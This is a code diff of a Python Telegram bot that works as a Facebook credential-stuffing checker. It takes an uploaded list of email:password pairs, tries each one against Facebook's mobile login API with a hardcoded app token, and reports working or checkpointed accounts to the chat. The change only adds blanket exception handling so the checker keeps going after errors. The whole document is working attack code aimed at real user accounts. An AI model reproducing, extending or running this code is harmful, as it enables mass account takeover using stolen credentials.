@@ -45,33 +45,35 @@ def handle_document(message):
 		filtered_lines = [line.strip() for line in lines if ':' in line]
 		results=[]
 		for line in filtered_lines:
-			z=line.split(":")
-			#print(len(z))
-			email=z[0]
-			password=z[1]
-			#g4q = random.choice(User_Agent)
-			data ={"locale": "en_GB","format": "json","email": email,"password": password,"access_token":"438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28","generate_session_cookies": 1}
-			head = {'user-agent': ug(),'Host':'graph.facebook.com','Content-Type':'application/json;charset=utf-8','Content-Length':'595','Connection':'Keep-Alive','Accept-Encoding':'gzip'}
-			po = requests.post("https://b-graph.facebook.com/auth/login",data=data,headers=head).json()
-			if 'session_key' in po:
-				bot.send_message(message.chat.id,text=f'''
-⋘─────━𓆩𝐋7𝐍𓆪‏━─────⋙
-❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {email}
-❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {password}
-<><><><><><><><><><><><><><>
-⋘─────━𓆩𝐋7𝐍𓆪‏━─────⋙
-@g_4_q  -  @ToPython
-				   		   ''')
-			elif 'www.facebook.com' in po['error']['message']:
-  				bot.send_message(message.chat.id,text=f'''
-⋘─────━𓆩𝐋7𝐍𓆪‏━─────⋙secure
-❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {email}
-❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {password}
-<><><><><><><><><><><><><><>
-⋘─────━𓆩𝐋7𝐍𓆪‏━─────⋙
-@g_4_q  -  @ToPython
-				   		   ''')
-			else:pass
+			try:
+				z=line.split(":")
+				#print(len(z))
+				email=z[0]
+				password=z[1]
+				#g4q = random.choice(User_Agent)
+				data ={"locale": "en_GB","format": "json","email": email,"password": password,"access_token":"438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28","generate_session_cookies": 1}
+				head = {'user-agent': ug(),'Host':'graph.facebook.com','Content-Type':'application/json;charset=utf-8','Content-Length':'595','Connection':'Keep-Alive','Accept-Encoding':'gzip'}
+				po = requests.post("https://b-graph.facebook.com/auth/login",data=data,headers=head).json()
+				if 'session_key' in po:
+					bot.send_message(message.chat.id,text=f'''
+	⋘─────━𓆩𝐋7𝐍𓆪‏━─────⋙
+	❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {email}
+	❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {password}
+	<><><><><><><><><><><><><><>
+	⋘─────━𓆩𝐋7𝐍𓆪‏━─────⋙
+	@g_4_q  -  @ToPython
+					   		   ''')
+				elif 'www.facebook.com' in po['error']['message']:
+	  				bot.send_message(message.chat.id,text=f'''
+	⋘─────━𓆩𝐋7𝐍𓆪‏━─────⋙secure
+	❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {email}
+	❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {password}
+	<><><><><><><><><><><><><><>
+	⋘─────━𓆩𝐋7𝐍𓆪‏━─────⋙
+	@g_4_q  -  @ToPython
+					   		   ''')
+				else:pass
+			except:pass
 		else:
 			response = "لا يوجد بيانات صالحة في الملف.\nيجب أن تكون البيانات علي النمط التالي\nEmail:password"
 			bot.reply_to(message, response)	
